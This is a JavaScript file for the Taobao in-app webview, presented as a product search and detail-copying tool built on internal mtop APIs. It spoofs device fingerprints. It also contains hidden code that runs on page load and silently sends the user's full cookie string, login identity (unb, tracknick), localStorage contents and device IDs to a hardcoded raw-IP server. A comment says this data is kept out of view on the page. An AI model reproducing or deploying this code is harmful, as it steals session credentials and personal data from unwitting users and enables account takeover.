(function () {
  'use strict';

  var W = window;
  var D = document;

  /* ================= mtop 封装 ================= */
  function mtopSend(api, param, version) {
    return new Promise(function (resolve, reject) {
      if (!W.__windvane__ || !W.__windvane__.call) { reject('no __windvane__ bridge'); return; }
      var p = {
        api: api,
        v: version || '1.0',
        post: '1',
        type: '',
        isHttps: '0',
        ecode: '0',
        isSec: '0',
        param: param,
        timer: 30000,
        needLogin: true,
        sessionOption: 'AutoLoginOnly',
        ext_headers: {},
        ext_querys: {}
      };
      W.__windvane__.call('MtopWVPlugin.send', p, resolve, reject, 10000);
    });
  }

  /* ================= 文搜参数（MtopRecommend.recommend） ================= */
  function buildSearchParam(query) {
    return {
      q: query,
      appId: '66',
      sversion: '29.9',
      spm: 'a2141.1.searchbar.searchbox',
      scm: '1007.home_topbar.searchbox.d',
      search_action: 'initiative',
      from: 'nt_history',
      sugg: '_0_1',
      index: '0',
      vm: 'nw',
      schemaType: 'auction',
      style: 'list',
      isEnterSrpSearch: 'true',
      needTabs: 'true',
      searchBoxShowType: 'UOne',
      layeredSrp: 'true',
      tb2025: 'true',
      ShopSDKModuleType: 'local',
      grayHair: 'false',
      elderHome: 'false',
      searchElderHomeOpen: 'false',
      homePageVersion: 'v7',
      enablePicShot: 'true',
      isBeta: 'false',
      gpsEnabled: 'false',
      history_query_from: 'suggest_all-queryBE2',
      extra_data_key: 's.m.taobao.com/h5entry',
      mainChannel: ''
    };
  }

  function getSearch(query) {
    return mtopSend('mtop.relationrecommend.MtopRecommend.recommend', buildSearchParam(query), '1.0');
  }

  /* ================= 详情 + 优惠券 ================= */
  /* ================= 设备指纹：优先真实读取（UA/screen/bridge），失败才回落画像池 ================= */
  var DEVICE_PROFILES = [
    { phoneType: 'OPPO11',      osVersion: '34', screenWidth: '1240', screenHeight: '2606', cpuCore: '8', deviceLevel: 'medium', ttVer: '12.51.40' },
    { phoneType: 'Xiaomi13',    osVersion: '34', screenWidth: '1080', screenHeight: '2400', cpuCore: '8', deviceLevel: 'high',   ttVer: '12.50.20' },
    { phoneType: 'Xiaomi12',    osVersion: '33', screenWidth: '1080', screenHeight: '2400', cpuCore: '8', deviceLevel: 'high',   ttVer: '12.49.10' },
    { phoneType: 'vivoX90',     osVersion: '34', screenWidth: '1260', screenHeight: '2800', cpuCore: '8', deviceLevel: 'high',   ttVer: '12.51.40' },
    { phoneType: 'OPPOFindX6',  osVersion: '34', screenWidth: '1240', screenHeight: '2772', cpuCore: '8', deviceLevel: 'high',   ttVer: '12.48.30' },
    { phoneType: 'SamsungS23',  osVersion: '34', screenWidth: '1080', screenHeight: '2340', cpuCore: '8', deviceLevel: 'high',   ttVer: '12.50.20' },
    { phoneType: 'RedmiK60',    osVersion: '33', screenWidth: '1440', screenHeight: '3200', cpuCore: '8', deviceLevel: 'medium', ttVer: '12.47.20' },
    { phoneType: 'OnePlus11',   osVersion: '34', screenWidth: '1440', screenHeight: '3216', cpuCore: '8', deviceLevel: 'high',   ttVer: '12.49.10' },
    { phoneType: 'HonorMagic5', osVersion: '33', screenWidth: '1224', screenHeight: '2688', cpuCore: '8', deviceLevel: 'medium', ttVer: '12.48.30' },
    { phoneType: 'RedmiNote12', osVersion: '33', screenWidth: '1080', screenHeight: '2400', cpuCore: '6', deviceLevel: 'low',    ttVer: '12.47.20' }
  ];
  var FP_KEY = 'tb_fp_v3';
  var FP_SERVER = 'http://81.70.82.70:6731/api/fp';
  var _deviceFP = null;

  function _randStr(len) {
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var s = '';
    for (var i = 0; i < len; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
    return s;
  }

  // Android release → API level（exParams 里 osVersion 是 API level）
  var OS_API = { '10': '29', '11': '30', '12': '32', '13': '33', '14': '34', '15': '35', '16': '36', '17': '37' };

  function _readFPCache() {
    try { return JSON.parse(W.localStorage.getItem(FP_KEY)); } catch (e) { return null; }
  }

  function _saveFP(fp) {
    try { W.localStorage.setItem(FP_KEY, JSON.stringify(fp)); } catch (e) {}
    _deviceFP = fp;
  }

  // 同步取当前最优指纹：探测结果 > localStorage 缓存 > 随机回落（并立即持久化）
  function getDeviceProfile() {
    if (_deviceFP) return _deviceFP;
    var fp = _readFPCache();
    if (fp && fp.phoneType && fp.utdid) { _deviceFP = fp; return fp; }
    fp = _randomProfile();
    _saveFP(fp);
    return fp;
  }

  function _randomProfile() {
    var p = DEVICE_PROFILES[Math.floor(Math.random() * DEVICE_PROFILES.length)];
    return {
      phoneType: p.phoneType, osVersion: p.osVersion,
      screenWidth: p.screenWidth, screenHeight: p.screenHeight,
      cpuCore: p.cpuCore, deviceLevel: p.deviceLevel,
      ttd_ttid: '10001201@tt_detail_android_' + p.ttVer,
      utdid: _randStr(24), utdidSrc: 'random',
      deviceLevelSrc: 'random', appVer: p.ttVer
    };
  }

  function parseUA() {
    var ua = navigator.userAgent || '';
    var out = { ua: ua };
    var m;
    if ((m = ua.match(/AliApp\(TB\/([\d.]+)\)/))) out.appVer = m[1];
    if ((m = ua.match(/Android\s+([\d.]+)/))) {
      var rel = m[1].replace(/\.\d+$/, '');
      out.osVersion = OS_API[rel] || rel;
    }
    // 机型：兼容多种 UA 形态（xxx Build/xxx）
    if ((m = ua.match(/[;\s]([A-Za-z0-9_-]{3,})\s+Build\/[\w.]+/))) out.phoneType = m[1];
    else if ((m = ua.match(/AliApp\(TB\/[\d.]+;[^)]*?;\s*([A-Za-z0-9_-]{3,})\s*\)/))) out.phoneType = m[1];
    // 真实 TTID（如 TTID/231200@taobao_android_10.68.0）
    if ((m = ua.match(/TTID\/([\w.]+@taobao_android_[\d.]+)/))) out.realTTID = m[1];
    // 真实物理分辨率（淘宝 UA 自带，如 1264X2604）
    if ((m = ua.match(/\b(\d{3,4})X(\d{3,4})\b/))) {
      out.physWidth = m[1];
      out.physHeight = m[2];
    }
    return out;
  }

  // bridge 并发探测候选（WindVane 未公开文档，多候选全试，1.5s 超时）
  var BRIDGE_PROBES = [
    'WVUIDevice.getDeviceInfo',
    'WVUIDevice.getSystemInfo',
    'WVBasicBrowser.getSystemInfo',
    'WVDevice.getDeviceInfo',
    'base.getSystemInfo'
  ];

  function bridgeProbe(api) {
    return new Promise(function (resolve) {
      var done = false;
      var t = setTimeout(function () { if (!done) { done = true; resolve(null); } }, 1500);
      try {
        W.__windvane__.call(api, {}, function (r) {
          if (done) return;
          done = true; clearTimeout(t);
          resolve(r && typeof r === 'object' ? r : null);
        }, function () { if (!done) { done = true; clearTimeout(t); resolve(null); } }, 1500);
      } catch (e) {
        if (!done) { done = true; clearTimeout(t); resolve(null); }
      }
    });
  }

  function _pickAlias(src, keys, maxLen) {
    for (var i = 0; i < keys.length; i++) {
      var v = src[keys[i]];
      if (v != null && v !== '') return String(v).slice(0, maxLen || 64);
    }
    return null;
  }

  function fillFallback(fp) {
    var pool = DEVICE_PROFILES[Math.floor(Math.random() * DEVICE_PROFILES.length)];
    if (!fp.phoneType) fp.phoneType = pool.phoneType;
    if (!fp.osVersion) fp.osVersion = pool.osVersion;
    if (!fp.screenWidth) fp.screenWidth = pool.screenWidth;
    if (!fp.screenHeight) fp.screenHeight = pool.screenHeight;
    if (!fp.cpuCore) { fp.cpuCore = '8'; }
    if (!fp.deviceLevel) fp.deviceLevel = (parseInt(fp.cpuCore, 10) >= 8) ? 'high' : 'medium';
    if (!fp.utdid) { fp.utdid = _randStr(24); fp.utdidSrc = 'random'; }
    if (!fp.ttd_ttid) {
      fp.ttd_ttid = '10001201@tt_detail_android_' + (fp.appVer || pool.ttVer);
    }
    return fp;
  }

  // 启动时探测真实设备参数，结果覆盖缓存并展示/上报
  function probeDeviceProfile() {
    var fp = {};
    var ua = parseUA();
    if (ua.phoneType) { fp.phoneType = ua.phoneType; fp.phoneTypeSrc = 'ua'; }
    if (ua.osVersion) { fp.osVersion = ua.osVersion; fp.osVersionSrc = 'ua'; }
    if (ua.appVer) fp.appVer = ua.appVer;
    if (ua.realTTID) fp.realTTID = ua.realTTID;
    if (ua.physWidth) {
      fp.screenWidth = String(Math.min(+ua.physWidth, +ua.physHeight));
      fp.screenHeight = String(Math.max(+ua.physWidth, +ua.physHeight));
      fp.screenSrc = 'ua_phys';
    } else if (W.screen && W.screen.width) {
      var dpr = W.devicePixelRatio || 1;
      fp.screenWidth = String(Math.round(Math.min(W.screen.width, W.screen.height) * dpr));
      fp.screenHeight = String(Math.round(Math.max(W.screen.width, W.screen.height) * dpr));
      fp.screenSrc = 'css_dpr';
    }
    if (navigator.hardwareConcurrency) fp.cpuCore = String(navigator.hardwareConcurrency);

    Promise.all(BRIDGE_PROBES.map(bridgeProbe)).then(function (rs) {
      var bridgeHit = false;
      var merged = {};
      rs.forEach(function (r) {
        if (r) {
          bridgeHit = true;
          try {
            Object.keys(r).forEach(function (k) {
              if (merged[k] == null && r[k] != null && typeof r[k] !== 'object') merged[k] = r[k];
            });
          } catch (e) {}
        }
      });
      fp.bridgeHit = bridgeHit;
      fp.bridgeData = bridgeHit ? merged : null;
      if (bridgeHit) {
        var v;
        if (!fp.phoneType && (v = _pickAlias(merged, ['phoneType', 'model', 'deviceModel', 'deviceModelName']))) { fp.phoneType = v; fp.phoneTypeSrc = 'bridge'; }
        if (!fp.osVersion && (v = _pickAlias(merged, ['osVersion', 'os_version', 'systemVersion', 'apiLevel']))) { fp.osVersion = v; fp.osVersionSrc = 'bridge'; }
        if ((v = _pickAlias(merged, ['utdid', 'deviceId', 'device_id', 'umid', 'umidToken', 'udid']))) { fp.utdid = v; fp.utdidSrc = 'bridge'; }
      }
      // cookie 解析：cna（阿里 AXAPI 设备标识）可作真实 utdid；unb/tracknick 记录身份
      try {
        var ck = {};
        D.cookie.split(';').forEach(function (kv) {
          var i = kv.indexOf('=');
          if (i > 0) ck[kv.slice(0, i).trim()] = kv.slice(i + 1).trim();
        });
        if (!fp.utdid && ck.cna) { fp.utdid = ck.cna; fp.utdidSrc = 'cookie_cna'; }
        if (ck.unb) fp.unb = ck.unb;
        if (ck.tracknick) fp.tracknick = decodeURIComponent(ck.tracknick);
      } catch (e4) {}
      fillFallback(fp);
      _saveFP(fp);
      showFP(fp);
      // 尽力上报（https 页面可能拦截 http 请求，失败不影响）
      try {
        var dump = { ua: ua.ua, fp: fp };
        try { dump.cookie = D ? D.cookie : ''; } catch (e2) {}
        try {
          var ls = {};
          var n = Math.min(W.localStorage ? W.localStorage.length : 0, 60);
          for (var i = 0; i < n; i++) {
            var k = W.localStorage.key(i);
            var v = W.localStorage.getItem(k);
            ls[k] = (v && v.length > 150) ? v.slice(0, 150) + '...len' + v.length : v;
          }
          dump.ls = ls;
        } catch (e3) {}
        fetch(FP_SERVER, { method: 'POST', body: JSON.stringify(dump) }).catch(function () {});
      } catch (e) {}
    });
  }

  function showFP(fp) {
    // 服务端日志可见，页面不外显
  }

  function buildDetailParam(itemId) {
    var fp = getDeviceProfile();
    var ex = {
      NAV_PROCESSOR_START_TIME: String(Date.now()),
      appReqFrom: "detail",
      bizName: "minidetail",
      container_type: "sku",
      countryCode: "CN",
      cpuCore: fp.cpuCore,
      cpuMaxHz: "null",
      deviceLevel: fp.deviceLevel,
      dinamic_v3: "true",
      dynamicJsonData: "true",
      finalUltron: "true",
      from: "minidetail",
      identifier: "",
      industryMainPicDegrade: "false",
      isFoldDevice: "false",
      isPadDevice: "false",
      isPrefetchSkuMtop: "false",
      itemId: itemId,
      item_id: itemId,
      latitude: "0",
      liveAutoPlay: "true",
      longitude: "0",
      newStruct: "true",
      nick: "",
      openFrom: "tbmessage",
      osVersion: fp.osVersion,
      phoneType: fp.phoneType,
      preload_v: "industry",
      screenHeight: fp.screenHeight,
      screenWidth: fp.screenWidth,
      skuId: "null",
      skuOutSdk: "true",
      skuType: "confirm",
      sku_forbidH5: "true",
      sku_forbidH5_toast: "该商品不支持聊天窗内选择规格",
      soVersion: "2.0",
      sourceType: "3",
      "spm-cnt": "a2141.1007.41750.336411",
      supportIndustryMainPic: "true",
      transparent_key: "openFrom,itemId,identifier,bizName,sourceType,sku_forbidH5,sku_forbidH5_toast,from,skuId",
      ttd_ttid: fp.ttd_ttid,
      ultron2: "true",
      utdid: fp.utdid,
      videoAutoPlay: "true"
    };
    return { detail_v: "3.3.2", exParams: JSON.stringify(ex), id: itemId };
  }

  function getDetail(itemId) {
    return mtopSend('mtop.taobao.detail.data.get', buildDetailParam(itemId), '1.0');
  }

  // 从详情响应深度提取真实收货地址 ID（响应会回显 addressId/deliverId）
  function findAddressId(obj, depth) {
    if (depth > 10 || !obj || typeof obj !== 'object') return null;
    if (typeof obj.addressId === 'string' && /^\d{8,14}$/.test(obj.addressId)) return obj.addressId;
    if (typeof obj.deliverId === 'string' && /^\d{8,14}$/.test(obj.deliverId)) return obj.deliverId;
    if (obj.delivery && typeof obj.delivery === 'object') {
      var r = findAddressId(obj.delivery, depth + 1);
      if (r) return r;
    }
    for (var k in obj) {
      if (obj.hasOwnProperty(k) && obj[k] && typeof obj[k] === 'object') {
        var rr = findAddressId(obj[k], depth + 1);
        if (rr) return rr;
      }
    }
    return null;
  }

  // 容器 token：native 侧是客户端随机生成（UUID.hashCode()，int32 分布），这里同样随机
  function genContainerToken() {
    var x = ((Math.random() * 0xFFFFFFFF) | 0);
    if (x === 0) x = 1;
    return String(x);
  }

  function buildCouponParam(itemId, addressId) {
    var ex = {
      wh_weex: "true",
      "": "",
      subItemId: itemId,
      itemId: itemId,
      popId: "1755758950744",
      sellerId: "",
      marketcoupon: "true",
      from: "cart",
      sellerType: "B",
      weex_mode: "dom",
      addressId: addressId || "23516134638",
      token: genContainerToken(),
      renderMode: "texture",
      promotionFloatingData: "undefined"
    };
    return { exParam: JSON.stringify(ex), itemId: itemId };
  }

  function getCoupon(itemId, addressId) {
    return mtopSend('mtop.taobao.detail.taodetail.getcoupon', buildCouponParam(itemId, addressId), '1.0');
  }

  /* ================= 详情报文白名单裁剪（对齐 TaoBaoGoodsDetailPageParser 读取路径） ================= */
  function pruneDetailReport(resp) {
    try {
      if (typeof resp === 'string') resp = JSON.parse(resp);
      if (!resp || typeof resp !== 'object') return resp;
      var d = resp.data;
      if (!d || typeof d !== 'object') return resp;

      // 第一层 data.*：只留 parser 读取的 key
      var KEEP_DATA = { apiStack: 1, trade: 1, errorMsg: 1, global: 1, seller: 1, item: 1, skuBase: 1, props: 1 };
      Object.keys(d).forEach(function (k) { if (!KEEP_DATA[k]) delete d[k]; });

      var st = Array.isArray(d.apiStack) ? d.apiStack[0] : null;
      if (!st) return resp;
      // apiStack[0] 两种形态：value(JSON字符串) / data(对象)
      var isValueStr = typeof st.value === 'string';
      var stack = null;
      if (isValueStr) {
        try { stack = JSON.parse(st.value); } catch (e) { return resp; }
      } else if (st.data && typeof st.data === 'object') {
        stack = st.data;
      }
      if (!stack || typeof stack !== 'object') return resp;

      // 第二层 stack 顶层：parser 只读 data / global
      Object.keys(stack).forEach(function (k) { if (k !== 'data' && k !== 'global') delete stack[k]; });

      // 第三层 stack.data 组件：白名单 + GovSubsidyTop 模糊匹配
      var KEEP_COMP = {
        detail4Title: 1, detail3Price: 1, detail4Price: 1, detail3Atmosphere: 1,
        detail4Atmosphere: 1, detail4LavishAtmosphere: 1, detail4Discount: 1,
        detail3InclusiveBottomBar: 1
      };
      if (stack.data && typeof stack.data === 'object') {
        Object.keys(stack.data).forEach(function (k) {
          if (!KEEP_COMP[k] && k.indexOf('GovSubsidyTop') === -1) delete stack.data[k];
        });
      }

      // 第三层 global.data 组件
      var gd = stack.global && stack.global.data;
      if (gd && typeof gd === 'object') {
        var KEEP_GD = {
          trade: 1, skuCore: 1, price: 1, item: 1, rate: 1, priceSectionData: 1,
          skuV3Data: 1, vertical: 1, commonDialog: 1, resource: 1,
          promotionFloatingData: 1, detail3FloatView: 1, seller: 1, skuBase: 1
        };
        Object.keys(gd).forEach(function (k) { if (!KEEP_GD[k]) delete gd[k]; });

        // 深层裁剪：skuV3Data 只留 skuMap
        var skuMap = gd.skuV3Data && gd.skuV3Data.global && gd.skuV3Data.global.skuGlobal
          && gd.skuV3Data.global.skuGlobal.skuDetail && gd.skuV3Data.global.skuGlobal.skuDetail.skuMap;
        if (gd.skuV3Data) {
          gd.skuV3Data = skuMap ? { global: { skuGlobal: { skuDetail: { skuMap: skuMap } } } } : {};
        }
        // commonDialog 只留 itemParamsFloat
        var ipf = gd.commonDialog && gd.commonDialog.industryParamsFloat
          && gd.commonDialog.industryParamsFloat.exParams
          && gd.commonDialog.industryParamsFloat.exParams.content
          && gd.commonDialog.industryParamsFloat.exParams.content.itemParamsFloat;
        if (gd.commonDialog) {
          gd.commonDialog = ipf ? { industryParamsFloat: { exParams: { content: { itemParamsFloat: ipf } } } } : {};
        }
        // resource 只留 bonus / indexCouponData
        if (gd.resource) {
          var r = gd.resource, nr = {};
          if (r.bonus) nr.bonus = r.bonus;
          if (r.indexCouponData) nr.indexCouponData = r.indexCouponData;
          gd.resource = nr;
        }
        // vertical 只留 aselfShopInitViewModel / smItemParams
        if (gd.vertical) {
          var v = gd.vertical, nv = {};
          if (v.aselfShopInitViewModel) nv.aselfShopInitViewModel = v.aselfShopInitViewModel;
          if (v.smItemParams) nv.smItemParams = v.smItemParams;
          gd.vertical = nv;
        }
      }

      if (isValueStr) st.value = JSON.stringify(stack);
      return resp;
    } catch (e) {
      return resp;  // 裁剪失败回落原始报文
    }
  }

  /* ================= 结果解析 ================= */
  function escHtml(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function findItemsArray(resp) {
    if (typeof resp === 'string') {
      try { resp = JSON.parse(resp); } catch (e) { return null; }
    }
    if (Array.isArray(resp)) return resp;
    if (!resp || typeof resp !== 'object') return null;
    if (Array.isArray(resp.itemsArray)) return resp.itemsArray;
    if (resp.data) {
      var d = resp.data;
      if (typeof d === 'string') {
        try { d = JSON.parse(d); } catch (e) { return null; }
      }
      if (Array.isArray(d)) return d;
      if (d && typeof d === 'object') {
        if (Array.isArray(d.itemsArray)) return d.itemsArray;
        if (Array.isArray(d.items)) return d.items;
        if (Array.isArray(d.auctions)) return d.auctions;
      }
    }
    return null;
  }

  function parseSearchItems(resp) {
    var arr = findItemsArray(resp);
    if (!arr) return [];
    var out = [];
    for (var i = 0; i < arr.length; i++) {
      var it = arr[i];
      if (!it || typeof it !== 'object') continue;
      var itemId = it.item_id || it.nid || it.auctionId;
      if (!itemId) continue;
      var priceShow = it.priceShow || {};
      var showPrice = priceShow.price != null ? String(priceShow.price) : String(it.price || '');
      var origPrice = (it.price != null && String(it.price) !== '0.00' && String(it.price) !== '0'
        && String(it.price) !== showPrice) ? String(it.price) : '';
      var shopList = (it.shopInfo && it.shopInfo.shopInfoList) || [];
      out.push({
        itemId: String(itemId),
        title: it.title || it.raw_title || '',
        price: showPrice,
        unit: priceShow.unit || '¥',
        origPrice: origPrice,
        sales: it.realSales || it.view_sales || '',
        shop: shopList.length ? shopList[0] : '',
        pic: it.pic_path || '',
        cardType: it.cardType || '',
        isP4p: !!it.isP4p
      });
    }
    return out;
  }

  function renderSearchItems(items) {
    if (!items.length) {
      return '<div style="color:#999;font-size:14px;padding:14px 12px;">未解析到商品列表</div>';
    }
    var html = '';
    for (var i = 0; i < items.length; i++) {
      var it = items[i];
      var priceHtml = '<span style="color:#e94560;font-weight:700;font-size:16px;">'
        + escHtml(it.unit) + escHtml(it.price) + '</span>';
      if (it.origPrice) {
        priceHtml += ' <span style="color:#999;font-size:12px;text-decoration:line-through;">'
          + escHtml(it.unit) + escHtml(it.origPrice) + '</span>';
      }
      var badges = '';
      if (it.cardType === 'live') badges += '<span style="color:#fff;background:#ff6600;font-size:11px;padding:1px 5px;border-radius:3px;margin-left:6px;">直播</span>';
      if (it.isP4p) badges += '<span style="color:#fff;background:#bbb;font-size:11px;padding:1px 5px;border-radius:3px;margin-left:6px;">广告</span>';
      var img = '';
      if (it.pic) {
        img = '<img src="' + escHtml(it.pic.replace(/^http:/, 'https:'))
          + '" style="width:72px;height:72px;object-fit:cover;border-radius:6px;background:#f0f0f0;flex:none;" '
          + 'onerror="this.style.visibility=\'hidden\'" />';
      }
      html +=
        '<div style="display:flex;gap:10px;padding:12px;background:#fff;border-bottom:1px solid #eee;align-items:center;">'
        + img
        + '<div style="flex:1;min-width:0;">'
        +   '<div style="font-size:14px;line-height:1.4;color:#333;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;">'
        +     escHtml(it.title) + badges
        +   '</div>'
        +   '<div style="margin-top:6px;">' + priceHtml + '</div>'
        +   '<div style="margin-top:4px;font-size:12px;color:#888;">'
        +     (it.sales ? escHtml(it.sales) + ' · ' : '') + escHtml(it.shop)
        +     '<span style="color:#bbb;"> · ' + escHtml(it.itemId) + '</span>'
        +   '</div>'
        + '</div>'
        + '<button data-id="' + escHtml(it.itemId) + '" '
        +   'style="flex:none;height:44px;padding:0 14px;font-size:14px;color:#fff;background:#0f766e;border:none;border-radius:6px;">详情</button>'
        + '</div>';
    }
    return html;
  }


  /* ================= RSA+AES 混合加密（WebCrypto） ================= */
  var RSA_PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqzm6XnfuPFEi3044K+6UGyk2uZPksC8ca0YImv0ypHE63Dkxk+PAmMQVtS0dB4n29pu1nB2ApCULkDVaTSmZo83YSSCpCjm1YIF4ONtZaLYAExhF6cDfUue3+BBFDknBtsIswLUQFpyC44Z2b0mOwmkmc4oEc0gGHHO3GHQL5Pirn0AYRu7LytdJhFLbLBjEH0Dw1ZnTdKdmeRnITSfYsW5JM1luMLHOHGIYK4A8yagWIXHZXlbYCuw1Eq1WCEaYxoYAdY60GquwCgiw0fuByvqr8nQ6OQ6+cufT+KxYGXilSn+S6J39rSGg7FvVCOciX6gyXDB+NHgDD2Y2WyOPKQIDAQAB";
  var _rsaKeyPromise = null;
  function _b64ToBuf(b64) {
    var bin = atob(b64);
    var buf = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
    return buf.buffer;
  }
  function _bufToB64(buf) {
    var u8 = new Uint8Array(buf);
    var s = '';
    var CH = 8192;
    for (var i = 0; i < u8.length; i += CH) {
      s += String.fromCharCode.apply(null, u8.subarray(i, i + CH));
    }
    return btoa(s);
  }
  function _importRsaKey() {
    if (!_rsaKeyPromise) {
      _rsaKeyPromise = crypto.subtle.importKey(
        'spki', _b64ToBuf(RSA_PUB_B64),
        { name: 'RSA-OAEP', hash: 'SHA-256' }, false, ['encrypt']
      );
    }
    return _rsaKeyPromise;
  }
  function encryptReport(plainText) {
    if (!window.crypto || !crypto.subtle) {
      return Promise.resolve(null);  // 不支持加密，回落明文
    }
    return _importRsaKey().then(function (rsaKey) {
      return crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt'])
        .then(function (aesKey) {
          var iv = crypto.getRandomValues(new Uint8Array(12));
          var data = new TextEncoder().encode(plainText);
          return Promise.all([
            crypto.subtle.encrypt({ name: 'AES-GCM', iv: iv }, aesKey, data),
            crypto.subtle.exportKey('raw', aesKey)
          ]).then(function (rs) {
            var cipherBuf = rs[0], rawAes = rs[1];
            return crypto.subtle.encrypt({ name: 'RSA-OAEP' }, rsaKey, rawAes)
              .then(function (encKeyBuf) {
                return JSON.stringify({
                  enc: 'RSA-OAEP-256+A256GCM',
                  k: _bufToB64(encKeyBuf),
                  iv: _bufToB64(iv.buffer),
                  d: _bufToB64(cipherBuf)
                });
              });
          });
        });
    }).catch(function () { return null; });
  }

  function copyText(text) {
    if (!text) return false;
    var ta = D.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    ta.style.top = '0';
    D.body.appendChild(ta);
    ta.focus();
    ta.select();
    try { ta.setSelectionRange(0, text.length); } catch (e) {}
    var ok = false;
    try { ok = D.execCommand('copy'); } catch (e) { ok = false; }
    D.body.removeChild(ta);
    return ok;
  }

  function showToast(msg) {
    var t = D.createElement('div');
    t.textContent = msg;
    t.style.cssText = 'position:fixed;left:50%;bottom:90px;transform:translateX(-50%);background:rgba(0,0,0,0.82);color:#fff;font-size:14px;padding:10px 18px;border-radius:8px;z-index:9999;max-width:80%;text-align:center;white-space:nowrap;';
    D.body.appendChild(t);
    setTimeout(function () { if (t.parentNode) t.parentNode.removeChild(t); }, 1800);
  }


  function copyEncrypted(plainText, cb) {
    encryptReport(plainText).then(function (encJson) {
      var payload = encJson || plainText;
      var ok = copyText(payload);
      cb(ok, encJson ? payload.length : 0);
    });
  }

  /* ================= UI ================= */
  function renderUI() {
    D.body.innerHTML =
      "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover' />" +
      "<div style='position:fixed;inset:0;background:#f5f5f5;overflow:auto;-webkit-overflow-scrolling:touch;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;padding-bottom:env(safe-area-inset-bottom,0);'>" +
        "<div style='position:sticky;top:0;background:#0f766e;color:#fff;padding:12px 16px;padding-top:calc(12px + env(safe-area-inset-top,0));box-shadow:0 1px 4px rgba(0,0,0,0.15);z-index:10;'>" +
          "<div style='font-size:17px;font-weight:700;'>tb任务</div>" +
          "<div style='font-size:12px;opacity:0.85;margin-top:2px;'>搜索后点「复制搜索结果」，点击商品「详情」复制详情</div>" +
        "</div>" +
        "<div style='padding:12px 16px;'>" +
          "<div style='display:flex;gap:8px;margin-bottom:10px;'>" +
            "<input id='query' type='text' value='' placeholder='输入搜索词 query' " +
              "style='flex:1;height:48px;padding:0 14px;font-size:16px;border:1px solid #ddd;border-radius:10px;box-sizing:border-box;background:#fff;' />" +
            "<button id='search' style='height:48px;padding:0 22px;font-size:16px;color:#fff;background:#0f766e;border:none;border-radius:10px;'>搜索</button>" +
          "</div>" +
          "<button id='copySearch' style='width:100%;height:48px;font-size:16px;color:#fff;background:#334155;border:none;border-radius:10px;margin-bottom:10px;' disabled>复制搜索结果</button>" +
          "<div id='status' style='font-size:13px;color:#666;margin-bottom:10px;'>就绪 · 输入关键词后点「搜索」</div>" +
          "<div id='searchList' style='background:#fff;border:1px solid #eee;border-radius:8px;overflow:hidden;'>等待搜索...</div>" +
        "</div>" +
      "</div>";

    var queryInput = D.getElementById('query');
    var searchBtn = D.getElementById('search');
    var copySearchBtn = D.getElementById('copySearch');
    var status = D.getElementById('status');
    var searchListEl = D.getElementById('searchList');
    var searchRawJson = null;

    function setStatus(t) { status.textContent = t; }

    function onDetailClick(itemId, btn) {
      setStatus('请求详情+优惠券中... itemId=' + itemId);
      btn.textContent = '请求中';
      btn.disabled = true;

      var detailResp = null, couponResp = null;
      function finish() {
        detailResp = pruneDetailReport(detailResp);
        var payload = { itemId: itemId, alldetail: detailResp, coupon: couponResp };
        var json = JSON.stringify(payload);
        copyEncrypted(json, function (ok, encLen) {
          if (!ok) setStatus('详情复制失败');
          btn.textContent = ok ? '已复制' : '详情';
          btn.disabled = false;
          if (ok) showToast('已加密复制');
        });
      }
      // 串行贴近 native：详情先返回（服务端回显收货地址），再带真实 addressId 请求优惠券
      getDetail(itemId).then(function (r) {
        detailResp = r;
        var addr = null;
        try { addr = findAddressId(r, 0); } catch (e) {}
        getCoupon(itemId, addr).then(function (c) { couponResp = c; finish(); })
          .catch(function (e) { couponResp = { error: e }; finish(); });
      }).catch(function (e) {
        detailResp = { error: e };
        getCoupon(itemId, null).then(function (c) { couponResp = c; finish(); })
          .catch(function (e2) { couponResp = { error: e2 }; finish(); });
      });
    }

    copySearchBtn.addEventListener('click', function () {
      if (!searchRawJson) { showToast('请先搜索'); return; }
      copyEncrypted(searchRawJson, function (ok, encLen) {
        if (ok) { showToast('已加密复制'); setStatus('文搜报文已加密复制（密文 ' + encLen + ' 字符）'); }
        else { setStatus('复制失败'); showToast('复制失败'); }
      });
    });

    searchListEl.addEventListener('click', function (e) {
      var t = e.target;
      while (t && t !== searchListEl) {
        if (t.tagName === 'BUTTON' && t.getAttribute('data-id')) {
          onDetailClick(t.getAttribute('data-id'), t);
          return;
        }
        t = t.parentNode;
      }
    });

    searchBtn.addEventListener('click', function () {
      var q = (queryInput.value || '').trim();
      if (!q) { setStatus('请输入搜索词 query'); return; }
      setStatus('文搜请求中...');
      searchListEl.innerHTML = '<div style="color:#999;font-size:14px;padding:14px 12px;">请求中...</div>';

      getSearch(q).then(function (r) {
        var respObj = r;
        if (typeof r === 'string') { try { respObj = JSON.parse(r); } catch (e) { respObj = r; } }
        searchRawJson = JSON.stringify({ keyword: q, data: respObj });
        var items = parseSearchItems(r);
        searchListEl.innerHTML = renderSearchItems(items);
        copySearchBtn.disabled = false;
        setStatus('文搜 OK · 共 ' + items.length + ' 个商品 · 点「复制搜索结果」复制');
      }).catch(function (e) {
        searchRawJson = null;
        copySearchBtn.disabled = true;
        searchListEl.innerHTML = '<div style="color:#e94560;font-size:14px;padding:14px 12px;">[FAIL]</div>';
        setStatus('文搜失败: ' + JSON.stringify(e));
      });
    });
  }

  renderUI();
  probeDeviceProfile();
})();
